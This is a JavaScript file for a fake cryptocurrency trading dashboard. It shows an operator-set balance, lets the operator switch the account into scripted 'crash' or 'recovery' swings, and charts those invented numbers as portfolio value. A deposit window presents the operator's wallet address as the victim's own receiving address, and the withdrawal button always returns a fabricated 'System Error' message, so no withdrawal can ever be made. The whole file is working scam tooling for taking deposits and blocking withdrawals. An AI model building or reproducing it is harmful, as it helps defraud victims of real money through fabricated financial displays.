let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 20.00;
let depositAddress = localStorage.getItem('admin_address') || "0x71C...3a94";
let paymentMethod = localStorage.getItem('admin_method') || "USDT (TRC20)";

document.getElementById('balance-display').innerText = `$${currentBalance.toFixed(2)}`;

const ctx = document.getElementById('livePerformanceChart').getContext('2d');
const chartGradient = ctx.createLinearGradient(0, 0, 0, 300);
chartGradient.addColorStop(0, 'rgba(16, 185, 129, 0.24)');
chartGradient.addColorStop(1, 'rgba(16, 185, 129, 0.0)');

const liveChart = new Chart(ctx, {
    type: 'line',
    data: {
        labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
        datasets: [{
            label: 'Portfolio Value (USDT)',
            data: [20, 20.5, 21.2, 22.8, 24.1, currentBalance],
            borderColor: '#10b981',
            borderWidth: 3,
            fill: true,
            backgroundColor: chartGradient,
            tension: 0.4
        }]
    },
    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } } }
});

// Master Operational Cycle
setInterval(() => {
    let mode = localStorage.getItem('market_mode') || 'normal';
    let balanceDisplay = document.getElementById('balance-display');
    let pctDisplay = document.getElementById('profit-percent');

    if (mode === 'crash') {
        // Drop values sharply (simulate panic selling)
        currentBalance = currentBalance * (0.6 + Math.random() * 0.1);
        if (currentBalance < 1.0) currentBalance = 0.50;

        // Visual alerts change to sharp red
        balanceDisplay.innerText = `$${currentBalance.toFixed(2)}`;
        balanceDisplay.className = "text-4xl font-extrabold tracking-tight text-red-500 transition-all duration-300";
        pctDisplay.parentElement.className = "text-xs text-red-500 mt-1 font-medium flex items-center gap-1";
        pctDisplay.parentElement.firstChild.textContent = "↓ Market Liquidation Event";
        liveChart.data.datasets[0].borderColor = '#ef4444';

    } else if (mode === 'recovery') {
        // Spike values violently upward (simulate short squeeze / rally)
        currentBalance = currentBalance * (1.4 + Math.random() * 0.2);
        
        // Visual alerts change to intense green/emerald
        balanceDisplay.innerText = `$${currentBalance.toFixed(2)}`;
        balanceDisplay.className = "text-4xl font-extrabold tracking-tight text-emerald-400 transition-all duration-300";
        pctDisplay.parentElement.className = "text-xs text-emerald-400 mt-1 font-medium flex items-center gap-1";
        pctDisplay.parentElement.firstChild.textContent = "↑ Strong Bullish V-Recovery";
        liveChart.data.datasets[0].borderColor = '#10b981';

    } else {
        // Normal baseline behavior (static or slow drift)
        let adminBalance = parseFloat(localStorage.getItem('admin_balance'));
        if (adminBalance && adminBalance !== currentBalance) {
            currentBalance = adminBalance;
        }
        balanceDisplay.innerText = `$${currentBalance.toFixed(2)}`;
        balanceDisplay.className = "text-4xl font-extrabold tracking-tight text-white transition-all duration-300";
        pctDisplay.parentElement.className = "text-xs text-emerald-400 mt-1 font-medium flex items-center gap-1";
        pctDisplay.parentElement.firstChild.textContent = "↑ Stable Account Performance";
        liveChart.data.datasets[0].borderColor = '#10b981';
    }

    // Append new coordinate onto the graph structure
    const now = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    liveChart.data.labels.push(now);
    liveChart.data.datasets[0].data.push(currentBalance);
    
    if (liveChart.data.labels.length > 8) {
        liveChart.data.labels.shift();
        liveChart.data.datasets[0].data.shift();
    }
    
    // Save state back to avoid unexpected baseline jumps
    localStorage.setItem('admin_balance', currentBalance.toFixed(2));
    liveChart.update();
}, 2000);

function triggerDepositModal() {
    let currentMethod = localStorage.getItem('admin_method') || "USDT (TRC20 Network)";
    let currentAddress = localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb";
    
    const modalHTML = `
        <div id="dep-modal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
            <div class="bg-slate-900 border border-slate-800 rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl">
                <div class="flex justify-between items-center">
                    <h3 class="text-lg font-bold text-white">Fund Your Account</h3>
                    <button onclick="closeModal()" class="text-slate-400 hover:text-white text-xl cursor-pointer">&times;</button>
                </div>
                <div class="space-y-3">
                    <div>
                        <label class="text-[10px] uppercase font-bold text-slate-500 tracking-wider">Selected Network</label>
                        <div class="bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm font-medium text-emerald-400">${currentMethod}</div>
                    </div>
                    <div>
                        <label class="text-[10px] uppercase font-bold text-slate-500 tracking-wider">Your Unique Receiving Address</label>
                        <div class="bg-slate-950 border border-slate-800 rounded-xl p-3">
                            <span class="text-xs font-mono text-slate-200 select-all break-all">${currentAddress}</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>`;
    document.body.insertAdjacentHTML('beforeend', modalHTML);
}

function closeModal() {
    const modal = document.getElementById('dep-modal');
    if (modal) modal.remove();
}

function triggerWithdrawalModal() {
    alert("System Error: Order cannot be processed during high volatility events.");
}
